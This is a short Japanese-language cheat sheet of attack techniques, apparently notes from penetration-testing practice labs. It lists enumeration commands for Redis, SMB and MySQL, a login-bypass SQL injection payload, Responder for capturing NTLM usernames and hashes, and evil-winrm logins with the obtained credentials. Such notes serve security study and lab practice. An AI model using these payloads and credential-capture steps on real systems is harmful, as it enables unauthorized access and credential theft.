# 攻撃手法メモまとめ

## Redis Enumeration

```bash
redis-cli -h <host_name> -p <port_number>
info
select 0  # データベースインデックス
keys *
get <key_name>
```

---

## SMB Enumeration

- 通常、TCPポート445はSMBプロトコル
- 開いていればSMBサーバーが稼働している可能性あり

```bash
smbclient -L <host_name>
# -L: 対象ホストの共有情報を表示（Sharename, Type, Comment）

smbclient \\\\<host_name>\\<Sharename>
```

---

## SQL Injection (典型例)

```text
username: admin'#
password: a
```

---

## MySQL Enumeration

```bash
mysql -u root -h <host_name>
show databases;
use <database_name>;
show tables;
```

---

## Responder & Evil-WinRM

### Responderの起動

```bash
locate Responder.py
sudo python3 /path/to/Responder.py -i tun0
```

- Webページを読み込む: `http://<IP address>/whatever/`
- ResponderがNTLMのユーザー名やハッシュを取得

### Evil-WinRMで接続

```bash
evil-winrm -i <host_name> -u <username> -p <password>
```

---
